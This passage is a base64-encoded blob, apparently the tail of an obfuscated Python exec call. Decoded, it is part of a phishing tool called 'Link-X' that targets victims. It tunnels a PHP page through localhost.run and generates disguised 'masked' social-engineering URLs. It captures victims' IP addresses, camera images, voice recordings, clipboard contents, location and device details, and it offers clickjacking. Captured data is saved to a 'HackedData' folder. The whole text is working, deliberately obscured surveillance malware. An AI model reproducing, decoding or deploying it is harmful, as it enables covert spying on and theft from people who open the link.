ICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcGFzcwogICAgICAgIHRpbWUuc2xlZXAoMSkKICAgIAogICAgaWYgbm90IG1haW5Vcmw6CiAgICAgICAgY1ByaW50KCJcbiAgICBbY1B1cnBsZSFjV2hpdGVdIEZhaWxlZCB0byBzdGFydCBsb2NhbGhvc3QucnVuIHR1bm5lbCEiKQogICAgICAgIGNQcmludCgiICAgIFtjUHVycGxlIWNXaGl0ZV0gQ2hlY2sgaW50ZXJuZXQgb3IgdHJ5IGFnYWluLlxuIikKICAgICAgICB0dW5uZWxfYWN0aXZlID0gRmFsc2UKICAgICAgICByZXR1cm4gIiIsICIiLCAiIgogICAgCiAgICBtYWluVXJsID0gbWFpblVybC5zdHJpcCgpCiAgICBpZiBub3QgbWFpblVybC5zdGFydHN3aXRoKCJodHRwczovLyIpOgogICAgICAgIG1haW5VcmwgPSAiaHR0cHM6Ly8iICsgbWFpblVybAoKICAgIHJldHVybiBtYWluVXJsLCAiIiwgIiIKCmRlZiBnZXRJcCgpOgogICAgcGF0aCA9ICIuc2VydmVyL2lwLnR4dCIKICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGgpOgogICAgICAgIHdpdGggb3BlbihwYXRoLCAiciIpIGFzIGY6CiAgICAgICAgICAgIGlwX2RhdGEgPSBbbGluZS5zdHJpcCgpIGZvciBsaW5lIGluIGYgaWYgbGluZS5zdHJpcCgpXQogICAgICAgIGlmIGlwX2RhdGE6CiAgICAgICAgICAgIGNQcmludCgiXG4gICAgY0JsdWVbY1B1cnBsZStjQmx1ZV0gY1doaXRlVmljdGltIE9wZW5lZCBUaGUgTGluayEhIikKICAgICAgICAgICAgY1ByaW50KGYiXG4gICAgW2NQdXJwbGV+Y1doaXRlXSBWaWN0aW0gSVBjUHVycGxlOiBjV2hpdGV7aXBfZGF0YVswXX0iKQogICAgICAgICAgICBjUHJpbnQoIlxuICAgIFtjUHVycGxlfmNXaGl0ZV0gU2F2ZWQgSW5jUHVycGxlOiBjV2hpdGVpcC50eHQiKQogICAgICAgICAgICBvcy5zeXN0ZW0oImNhdCAiICsgcGF0aCArICIgPj4gaXAudHh0IikKICAgICAgICAgICAgb3Muc3lzdGVtKCJybSAiICsgcGF0aCkKCmRlZiBnZXRMb2coKToKICAgIGF0dERlc0RpY3QgPSB7CiAgICAgICAgImNhbWVyYSI6IHsiZXh0IjogIi5wbmciLCAiaGVhZCI6ICJjYW1fIiwgImZpbGUiOiAiSW1hZ2UgRmlsZSJ9LAogICAgICAgICJ2b2ljZSI6IHsiZXh0IjogIi53YXYiLCAiaGVhZCI6ICJhdWRpb18iLCAiZmlsZSI6ICJWb2ljZSBGaWxlIn0sCiAgICAgICAgImNsaXBib2FyZCI6IHsiZXh0IjogIi5kYXQiLCAiaGVhZCI6ICJjYl8iLCAiZmlsZSI6ICJDbGlwYm9hcmQgRGF0YSJ9LAogICAgICAgICJsb2NhdGlvbiI6IHsiZXh0IjogIi5qc29uIiwgImhlYWQiOiAibG9jXyIsICJmaWxlIjogIkxvY2F0aW9uIERhdGEifSwKICAgICAgICAiZGV0YWlscyI6IHsiZXh0IjogIi5qc29uIiwgImhlYWQiOiAiZGV0YWlsc18iLCAiZmlsZSI6ICJEZXZpY2UgRGV0YWlscyJ9LAogICAgICAgICJjbGlja2phY2tpbmciOiB7ImV4dCI6ICIuanNvbiIsICJoZWFkIjogImNsaWNrXyIsICJmaWxlIjogIkNsaWNrIERhdGEifQogICAgfQogICAgaWYgYXR0YWNrTWV0aG9kIG5vdCBpbiBhdHREZXNEaWN0OgogICAgICAgIHJldHVybgoKICAgIGF0dGFjayA9IGF0dERlc0RpY3RbYXR0YWNrTWV0aG9kXQogICAgZXh0ID0gYXR0YWNrWyJleHQiXQogICAgaGVhZCA9IGF0dGFja1siaGVhZCJdCiAgICBmaWxlVHlwZSA9IGF0dGFja1siZmlsZSJdCiAgICBib2R5ID0gc3RyKHRpbWUudGltZSgpKVs6MTBdCgogICAgbG9nUGF0aCA9ICIuLy5zZXJ2ZXIvTG9nLmxvZyIKICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhsb2dQYXRoKToKICAgICAgICByZXR1cm4KICAgIGlmIG5vdCAob3Blbihsb2dQYXRoLCAiciIpLnJlYWQoKS5zdHJpcCgpID09ICJSZWNlaXZlZCIpOgogICAgICAgIHJldHVybgoKICAgIG9zLnJlbW92ZShsb2dQYXRoKQogICAgY1ByaW50KGYiXG4gICAgY1B1cnBsZVtjV2hpdGUrY1B1cnBsZV0gY1doaXRle2ZpbGVUeXBlfSBSZWNlaXZlZCEiKQoKICAgIGlmIGF0dGFja01ldGhvZCA9PSAiY2xpcGJvYXJkIjoKICAgICAgICBjbGlwRGF0YSA9IG9wZW4oIi5zZXJ2ZXIvZGF0YS5kYXQiLCAiciIpLnJlYWQoKQogICAgICAgIGNQcmludChmIlxuW2NQdXJwbGVEYXRhY1doaXRlXWNQdXJwbGU6IGNXaGl0ZXtjbGlwRGF0YX0iKQogICAgZWxpZiBhdHRhY2tNZXRob2QgPT0gImxvY2F0aW9uIjoKICAgICAgICBsb2NEYXRhID0gb3BlbigiLnNlcnZlci9kYXRhLmpzb24iLCAiciIpLnJlYWQoKQogICAgICAgIHByaW50TG9jYXRpb24obG9jRGF0YSkKICAgIGVsaWYgYXR0YWNrTWV0aG9kIGluIFsiZGV0YWlscyIsICJjbGlja2phY2tpbmciXToKICAgICAgICB3YWl0X2NvdW50ID0gMAogICAgICAgIHdoaWxlIG5vdCBvcy5wYXRoLmV4aXN0cygiLnNlcnZlci9kYXRhLmpzb24iKSBhbmQgd2FpdF9jb3VudCA8IDEwOgogICAgICAgICAgICB0aW1lLnNsZWVwKDAuMykKICAgICAgICAgICAgd2FpdF9jb3VudCArPSAxCiAgICAgICAgaWYgb3MucGF0aC5leGlzdHMoIi5zZXJ2ZXIvZGF0YS5qc29uIik6CiAgICAgICAgICAgIHdpdGggb3BlbigiLnNlcnZlci9kYXRhLmpzb24iLCAiciIpIGFzIGY6CiAgICAgICAgICAgICAgICBkZXZpY2VEYXRhID0gZi5yZWFkKCkKICAgICAgICAgICAgcHJpbnREZXRhaWxzKGRldmljZURhdGEpCgogICAgb3Muc3lzdGVtKGYibXYgLi8uc2VydmVyLyp7ZXh0fSAvc2RjYXJkL0hhY2tlZERhdGEve2hlYWR9e2JvZHl9e2V4dH0gMj4vZGV2L251bGwiKQoKZGVmIHN0YXJ0UHJvY2VzcygpOgogICAgZ2xvYmFsIG1hc2tVcmwsIHR1bm5lbF9hY3RpdmUKICAgIG1hc2tVcmwgPSAiIgogICAgcmVkaXJlY3RVcmwgPSAiIgoKICAgIGNQcmludCgiXG4iICsgKCLilIAiICogNDApLmNlbnRlcihjb2x1bW5zKSkKICAgIAogICAgbWFza19jaG9pY2UgPSBpbnB1dChjUHJpbnQoIlxuICAgIGNXaGl0ZVtjUHVycGxlKmNXaGl0ZV0gV2FudCB0byBnZW5lcmF0ZSBhIE1hc2tlZCBVUkwgZm9yIHNvY2lhbCBlbmdpbmVlcmluZz8gW2NQdXJwbGV5L25jV2hpdGVdOj4gIiwgVHJ1ZSkpLnN0cmlwKCkubG93ZXIoKQogICAgaWYgbWFza19jaG9pY2UgPT0gInkiOgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIG1hc2tfaW5wdXQgPSBpbnB1dChjUHJpbnQoIlxuICAgIFtjUHVycGxlKmNXaGl0ZV0gRW50ZXIgTWFzayBOYW1lIChlLmcuIGZyZWUtaXBob25lKTo+IGNXaGl0ZSIsIFRydWUpKS5zdHJpcCgpCiAgICAgICAgICAgIGlmIG1hc2tfaW5wdXQ6CiAgICAgICAgICAgICAgICBtYXNrVXJsID0gbWFza19pbnB1dAogICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGNQcmludCgiICAgIFtjUHVycGxlIWNXaGl0ZV0gTWFzayBuYW1lIGNhbm5vdCBiZSBlbXB0eS4iKQoKICAgIGlmIGF0dGFja01ldGhvZCA9PSAiY2xpY2tqYWNraW5nIjoKICAgICAgICBjUHJpbnQoIlxuICAgIGNXaGl0ZVtjUHVycGxlKmNXaGl0ZV0gQ2xpY2tKYWNraW5nIE1vZGUgQWN0aXZhdGVkIikKICAgICAgICBjUHJpbnQoIiAgICBjV2hpdGVbY1B1cnBsZSpjV2hpdGVdIFJlZGlyZWN0IEFmdGVyIENsaWNrOiBodHRwczovL3d3dy5hcHBsZS5jb20vICAiKQogICAgICAgIHJlZGlyZWN0VXJsID0gImh0dHBzOi8vd3d3LmFwcGxlLmNvbS8gICIKICAgIGVsc2U6CiAgICAgICAgY1ByaW50KCJcbiAgICBjV2hpdGVbY1B1cnBsZSpjV2hpdGVdIEVudGVyIGEgV2Vic2l0ZSBVUkwgdG8gUmVkaXJlY3QgVmljdGltIEFmdGVyIEV4cGxvaXQiKQogICAgICAgIGNQcmludCgiICAgIGNXaGl0ZShjUHVycGxlTGVhdmUgZW1wdHkgZm9yIGRlZmF1bHQ6IFlvdUFyZUdldHRpbmdPbGRjV2hpdGUpIikKICAgICAgICByZWRpcmVjdFVybCA9IGlucHV0KGNQcmludCgiICAgIGNQdXJwbGVbVVJMXWNXaGl0ZTo+ICIsIFRydWUpKS5zdHJpcCgpCgogICAgY1ByaW50KCJcbiIgKyAoIuKUgCIgKiA0MCkuY2VudGVyKGNvbHVtbnMpKQogICAgY1ByaW50KCIgICAgW2NQdXJwbGUhY1doaXRlXSBTZXR0aW5nIHVwIEZpbGVzLi4uIi5jZW50ZXIoY29sdW1ucykpCiAgICBzZXR1cEZpbGVzKHJlZGlyZWN0VXJsKQoKICAgIHRpbWUuc2xlZXAoMSkKICAgIGNQcmludCgiXG4gICAgW2NQdXJwbGUhY1doaXRlXSBTdGFydGluZyBQSFAgU2VydmVyLi4uIikKICAgIHBvcnQgPSBzdGFydFBIUCgpCiAgICB0aW1lLnNsZWVwKDIpCgogICAgbWFpblVybCwgXywgXyA9IHN0YXJ0TG9jYWxob3N0UnVuKHBvcnQsIE5vbmUpCgogICAgaWYgbm90IG1haW5Vcmw6CiAgICAgICAgY1ByaW50KCJcbiAgICBbY1B1cnBsZSFjV2hpdGVdIENhbm5vdCBwcm9jZWVkIHdpdGhvdXQgdHVubmVsLiBFeGl0aW5nLiIpCiAgICAgICAgc3lzLmV4aXQoMSkKCiAgICAjIOKchSBVUERBVEVEOiBOb3cgY2FtZXJhIHVzZXMgbWFzayBwYWdlIGxpa2Ugdm9pY2UKICAgIG1hc2tlZERpc3BsYXlVcmwgPSBOb25lCiAgICBpZiBtYXNrVXJsOgogICAgICAgIGlmIGF0dGFja01ldGhvZCBpbiBbImNhbWVyYSIsICJ2b2ljZSIsICJjbGlja2phY2tpbmciXToKICAgICAgICAgICAgbWFza2VkRGlzcGxheVVybCA9IGNyZWF0ZU1hc2tQYWdlKG1hc2tVcmwsIG1haW5VcmwpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgY2xlYW5NYXNrID0gbWFza1VybC5yZXBsYWNlKCIgIiwgIiIpLnJlcGxhY2UoIi8iLCAiIikuc3RyaXAoKQogICAgICAgICAgICBpZiBjbGVhbk1hc2s6CiAgICAgICAgICAgICAgICBtYXNrZWREaXNwbGF5VXJsID0gZiJodHRwczovL3tjbGVhbk1hc2t9QHttYWluVXJsLnJlcGxhY2UoJ2h0dHBzOi8vJywgJycpfSIKCiAgICBsb2dvKCkKICAgIGNQcmludChmIlxuY1doaXRlW2NQdXJwbGUqY1doaXRlXSBTdWNjZXNzZnVsbHkgSG9zdGVkIGF0Y1B1cnBsZTogY1doaXRlaHR0cDovL3tob3N0fTp7cG9ydH0iKQogICAgCiAgICBjUHJpbnQoZiJcbltjUHVycGxlfmNXaGl0ZV0gVVJMIDAxIChNYWluIFVSTCljUHVycGxlOiBjV2hpdGV7bWFpblVybH0iKQoKICAgIGlmIG1hc2tlZERpc3BsYXlVcmw6CiAgICAgICAgaWYgYXR0YWNrTWV0aG9kIGluIFsidm9pY2UiLCAiY2xpY2tqYWNraW5nIl06CiAgICAgICAgICAgIGNQcmludChmIlxuW2NQdXJwbGV+Y1doaXRlXSBVUkwgMDIgKE1hc2sgUGFnZSljUHVycGxlOiBjV2hpdGV7bWFza2VkRGlzcGxheVVybH0iKQogICAgICAgICAgICBjUHJpbnQoIlxuICAgIFtjUHVycGxlIWNXaGl0ZV0g8J+SoSBUaGlzIG1hc2sgcGFnZSByZWRpcmVjdHMgaW5zdGFudGx5IHRvIHRoZSByZWFsIHBheWxvYWQuIikKICAgICAgICAgICAgY1ByaW50KCIgICAgW2NQdXJwbGUhY1doaXRlXSDinIUgU2FmZSBmb3IgVm9pY2UgJiBDbGlja0phY2tpbmchIikKICAgICAgICBlbHNlOgogICAgICAgICAgICAjIE5vdyBpbmNsdWRlcyBjYW1lcmEKICAgICAgICAgICAgY1ByaW50KGYiXG5bY1B1cnBsZX5jV2hpdGVdIFVSTCAwMiAoTWFzayBQYWdlKWNQdXJwbGU6IGNXaGl0ZXttYXNrZWREaXNwbGF5VXJsfSIpCiAgICAgICAgICAgIGNQcmludCgiXG4gICAgW2NQdXJwbGUhY1doaXRlXSDimqEgTWFza2VkIFVSTCByZWFkeS4gV29ya3MgZm9yIENhbWVyYSwgVm9pY2UsIGFuZCBtb3JlLiIpCgogICAgY1ByaW50KCJcbltjUHVycGxlKmNXaGl0ZV0gRGF0YSBTYXZlZCBJbiBjUHVycGxlOiBjV2hpdGUvc2RjYXJkL0hhY2tlZERhdGEiKQogICAgY1ByaW50KCJcbltjUHVycGxlKmNXaGl0ZV0gV2FpdGluZyBmb3IgVmljdGltLCBQcmVzcyBjUHVycGxlQ3RybCBjV2hpdGUrIGNQdXJwbGVDIGNXaGl0ZXRvIFN0b3AuLi5cbiIpCgogICAgdHJ5OgogICAgICAgIHdoaWxlIFRydWU6CiAgICAgICAgICAgIHR1bm5lbF9jaGVjayA9IHNiLmdldG91dHB1dCgicHMgYXV4IHwgZ3JlcCAnbG9jYWxob3N0LnJ1bicgfCBncmVwIC12IGdyZXAgfCBncmVwIC12IHB5dGhvbiIpCiAgICAgICAgICAgIGlmIG5vdCB0dW5uZWxfY2hlY2suc3RyaXAoKSBhbmQgdHVubmVsX2FjdGl2ZToKICAgICAgICAgICAgICAgIGNQcmludCgiXG4gICAgW2NQdXJwbGUhY1doaXRlXSBUdW5uZWwgZG93biEgUmVzdGFydGluZy4uLiIpCiAgICAgICAgICAgICAgICBtYWluVXJsLCBfLCBfID0gc3RhcnRMb2NhbGhvc3RSdW4ocG9ydCwgTm9uZSkKICAgICAgICAgICAgICAgIGlmIG1haW5Vcmw6CiAgICAgICAgICAgICAgICAgICAgaWYgbWFza1VybCBhbmQgYXR0YWNrTWV0aG9kIGluIFsiY2FtZXJhIiwgInZvaWNlIiwgImNsaWNramFja2luZyJdOgogICAgICAgICAgICAgICAgICAgICAgICBtYXNrZWREaXNwbGF5VXJsID0gY3JlYXRlTWFza1BhZ2UobWFza1VybCwgbWFpblVybCkKICAgICAgICAgICAgICAgICAgICBsb2dvKCkKICAgICAgICAgICAgICAgICAgICBjUHJpbnQoZiJcbltjUHVycGxlfmNXaGl0ZV0gTmV3IFVSTDpjUHVycGxlIHttYWluVXJsfSIpCiAgICAgICAgICAgICAgICAgICAgaWYgbWFza2VkRGlzcGxheVVybDoKICAgICAgICAgICAgICAgICAgICAgICAgY1ByaW50KGYiW2NQdXJwbGV+Y1doaXRlXSBNYXNrIFVSTDpjUHVycGxlIHttYXNrZWREaXNwbGF5VXJsfSIpCiAgICAgICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgICAgIGNQcmludCgiXG4gICAgW2NQdXJwbGUhY1doaXRlXSBGYWlsZWQgdG8gcmVzdGFydCB0dW5uZWwuIikKICAgICAgICAgICAgICAgICAgICBicmVhawoKICAgICAgICAgICAgZ2V0SXAoKQogICAgICAgICAgICBnZXRMb2coKQogICAgICAgICAgICB0aW1lLnNsZWVwKDIpCiAgICBleGNlcHQgS2V5Ym9hcmRJbnRlcnJ1cHQ6CiAgICAgICAgdHVubmVsX2FjdGl2ZSA9IEZhbHNlCiAgICAgICAgY1ByaW50KCJcbiAgICBbY1B1cnBsZSFjV2hpdGVdIFByb2Nlc3MgU3RvcHBlZCBCeSBVc2VyXG4iKQogICAgICAgIGtpbGxBbGwoKQogICAgICAgIHN5cy5leGl0KCkKCmRlZiBtZW51KCk6CiAgICBsb2dvKCkKICAgIHBzYigiXG4gICAgY1doaXRlW2NQdXJwbGUqY1doaXRlXSBDaG9vc2UgWW91ciBPcHRpb246IFxuIikKICAgIGNQcmludCgiICAgIFtjUHVycGxlMDFjV2hpdGVdIENhbWVyYSBIYWNrIikKICAgIGNQcmludCgiICAgIFtjUHVycGxlMDJjV2hpdGVdIFZvaWNlIEhhY2siKQogICAgY1ByaW50KCIgICAgW2NQdXJwbGUwM2NXaGl0ZV0gQ2xpcGJvYXJkIEhhY2siKQogICAgY1ByaW50KCIgICAgW2NQdXJwbGUwNGNXaGl0ZV0gTG9jYXRpb24gSGFjayIpCiAgICBjUHJpbnQoIiAgICBbY1B1cnBsZTA1Y1doaXRlXSBDbGlja0phY2tpbmciKQogICAgY1ByaW50KCIgICAgW2NQdXJwbGUwNmNXaGl0ZV0gR2V0IFZpY3RpbSBEZXZpY2UgRGV0YWlscyIpCiAgICBjUHJpbnQoIiAgICBbY1B1cnBsZTA4Y1doaXRlXSBVcGRhdGUgVG9vbCIpCiAgICBjUHJpbnQoIiAgICBbY1B1cnBsZTAwY1doaXRlXSBFeGl0IikKCiAgICBvcCA9IGlucHV0KGNQcmludCgiXG4gICAgW2NQdXJwbGUqY1doaXRlXSBFbnRlciBZb3VyIENob2ljZTo+IGNQdXJwbGUiLCBUcnVlKSkuc3RyaXAoKQogICAgaWYgb3AgaW4gWyIwIiwgIjAwIl06CiAgICAgICAgY1ByaW50KCJcbiAgICBbY1B1cnBsZSFjV2hpdGVdIEV4aXRpbmcgTGluay1YLi4uXG4iKQogICAgICAgIGtpbGxBbGwoKQogICAgICAgIHN5cy5leGl0KDApCiAgICB3aGlsZSBvcCBub3QgaW4gWyIxIiwgIjIiLCAiMyIsICI0IiwgIjUiLCAiNiIsICI4Il06CiAgICAgICAgcHNiKCJcbiAgICBjV2hpdGVbY1B1cnBsZSFjV2hpdGVdIFdyb25nIENob2ljZSEiKQogICAgICAgIG9wID0gaW5wdXQoY1ByaW50KCJcbiAgICBbY1B1cnBsZSpjV2hpdGVdIEVudGVyIFlvdXIgQ2hvaWNlOj4gY1B1cnBsZSIsIFRydWUpKS5zdHJpcCgpCiAgICAgICAgaWYgb3AgaW4gWyIwIiwgIjAwIl06CiAgICAgICAgICAgIGNQcmludCgiXG4gICAgW2NQdXJwbGUhY1doaXRlXSBFeGl0aW5nIExpbmstWC4uLlxuIikKICAgICAgICAgICAga2lsbEFsbCgpCiAgICAgICAgICAgIHN5cy5leGl0KDApCgogICAgaWYgb3AgPT0gIjgiOgogICAgICAgIHVwZGF0ZSgpCgogICAgYXR0TGlzdCA9IFsiY2FtZXJhIiwgInZvaWNlIiwgImNsaXBib2FyZCIsICJsb2NhdGlvbiIsICJjbGlja2phY2tpbmciLCAiZGV0YWlscyJdCiAgICBnbG9iYWwgYXR0YWNrTWV0aG9kCiAgICBhdHRhY2tNZXRob2QgPSBhdHRMaXN0W2ludChvcCkgLSAxXQogICAgc3RhcnRQcm9jZXNzKCkKCmlmIF9fbmFtZV9fID09ICJfX21haW5fXyI6CiAgICByZXF1aXJlZCA9IFsicGhwIiwgImN1cmwiLCAid2dldCIsICJ1bnppcCIsICJzc2giXQogICAgaWYgYW55KHNiLmdldG91dHB1dChmImNvbW1hbmQgLXYge3BrZ30iKSA9PSAiIiBmb3IgcGtnIGluIHJlcXVpcmVkKToKICAgICAgICBvcy5zeXN0ZW0oInB5dGhvbiBzZXR1cC5weSIpCgogICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKCIvc2RjYXJkL0hhY2tlZERhdGEiKToKICAgICAgICBvcy5tYWtlZGlycygiL3NkY2FyZC9IYWNrZWREYXRhIiwgZXhpc3Rfb2s9VHJ1ZSkKICAgIGtpbGxBbGwoKQogICAgbWVudSgp').decode('utf-8'))
